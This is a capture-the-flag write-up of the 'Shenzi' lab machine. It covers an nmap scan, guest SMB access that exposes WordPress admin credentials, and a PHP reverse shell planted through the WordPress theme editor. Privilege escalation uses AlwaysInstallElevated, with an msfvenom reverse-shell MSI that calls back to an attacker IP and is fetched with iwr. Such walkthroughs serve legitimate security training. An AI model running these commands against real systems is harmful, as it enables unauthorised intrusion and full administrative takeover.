---
icon: windows
---

# Shenzi - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.159.55 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-02 23:35 EDT
Nmap scan report for 192.168.159.55
Host is up (0.028s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.159.55/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.159.55/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/2%OT=21%CT=1%CU=36244%PV=Y%DS=4%DC=T%G=Y%TM=68DF456
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%TS=U)SEQ(SP=1
OS:03%GCD=1%ISR=109%TI=I%CI=I%TS=U)SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%TS=U)
OS:SEQ(SP=108%GCD=1%ISR=109%TI=I%CI=I%TS=U)SEQ(SP=108%GCD=1%ISR=10D%TI=I%CI
OS:=I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578
OS:NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)EC
OS:N(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-02T19:39:09
|_  start_date: N/A
|_clock-skew: -8h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   25.50 ms 192.168.45.1
2   25.61 ms 192.168.45.254
3   25.64 ms 192.168.251.1
4   25.75 ms 192.168.159.55
```

### <mark style="color:$primary;">SMB Enumeration</mark>

```
netexec smb 192.168.159.55 -u guest -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>

We have Read Access to the Shenzi share, I am going to take a look

```
smbclient -N \\\\192.168.159.55\\Shenzi
```

<figure><img src="../../.gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>

```
admin:FeltHeadwallWight357
```

Found credentials for a WordPress site, I'll keep this in mind while enumerating port 80

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

When we first visit the website we get the default XAMPP page. After preforming directory busting with dirsearch the only useful endpoint I found was phpinfo.php

```
dirsearch -u http://192.168.159.55/
```

<figure><img src="../../.gitbook/assets/image (886).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (887).png" alt=""><figcaption></figcaption></figure>

I got the document root, this is good but nothing else. After googling the name of the box I found this, which was pretty funny

<figure><img src="../../.gitbook/assets/image (888).png" alt=""><figcaption></figcaption></figure>

If we visit [http://192.168.159.55/shenzi/](http://192.168.159.55/shenzi/) we will find the wordpress site

<figure><img src="../../.gitbook/assets/image (889).png" alt=""><figcaption></figcaption></figure>

Let's checkout wp-admin. We already have creds for the admin user

<figure><img src="../../.gitbook/assets/image (890).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (891).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Wordpress Authenticated PHP RCE</mark>

For this I will replace one of the default pages I can access from the outside with a php reverse shell.&#x20;

To do that first go to the Theme Editor

<figure><img src="../../.gitbook/assets/image (892).png" alt=""><figcaption></figcaption></figure>

On the right hand side you will see the php pages pick one that does not require any login authorization. I am going to pick 404.php

<figure><img src="../../.gitbook/assets/image (893).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (895).png" alt=""><figcaption></figcaption></figure>

Here we can edit the 404.php page remove everything and paste our reverse shell payload.&#x20;

I will use [**https://www.revshells.com/**](https://www.revshells.com/) to generate my payload

<figure><img src="../../.gitbook/assets/image (896).png" alt=""><figcaption></figcaption></figure>

Now copy this and paste it in 404.php. Make sure to click update file

<figure><img src="../../.gitbook/assets/image (897).png" alt=""><figcaption></figcaption></figure>

Now make sure you have a listener ready, and simply visit this page and you will get a reverse shell

```
http://192.168.159.55/shenzi/themes/twentytwenty/404.php
```

<figure><img src="../../.gitbook/assets/image (898).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (899).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (901).png" alt=""><figcaption></figcaption></figure>

After checking the privileges and a little bit of manual enumeration, I decided to run winpeas on the target machine

### <mark style="color:$primary;">Winpeas</mark>

<figure><img src="../../.gitbook/assets/image (900).png" alt=""><figcaption></figcaption></figure>

Winpeas found a direct route to privesc!

### <mark style="color:$primary;">AlwaysInstallElevated set to 1 in HKLM/HKCU</mark>

This means that .msi files \[_Microsoft Software Installer]_ are automatically installed with Administrative privileges. That's our solution. All we need to do to elevate our privileges is to create a malicious MSI file, transfer and install it.

<mark style="color:$info;">**Creating the malicious file**</mark>

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=445 -f msi -o shell.msi
```

<figure><img src="../../.gitbook/assets/image (902).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$info;">**Transfering the file to the target machine**</mark>

```
iwr -uri http://192.168.45.158/shell.msi -outfile shell.msi
```

<figure><img src="../../.gitbook/assets/image (903).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (904).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$info;">**Make sure you have a listener ready, execute and get a shell as the administrator!**</mark>

<figure><img src="../../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>

